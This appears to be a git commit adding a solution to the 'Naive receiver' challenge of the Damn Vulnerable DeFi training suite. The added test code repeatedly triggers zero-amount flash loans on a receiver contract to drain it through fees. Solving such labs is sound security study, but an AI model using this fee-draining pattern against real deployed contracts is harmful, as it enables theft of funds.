3220bc122b0e505369ce9afcec9f0e1cb775c5a8
VarunVerma7 <varunverma855@gmail.com>
2022-05-19 22:24:22 -0400

    lesson 2

--- damn-vulnerable-defi/test/naive-receiver/naive-receiver.challenge.js
+++ damn-vulnerable-defi/test/naive-receiver/naive-receiver.challenge.js
@@ -31,6 +31,16 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
+        await this.pool.flashLoan(this.receiver.address, 0)
     });
 
     after(async function () {
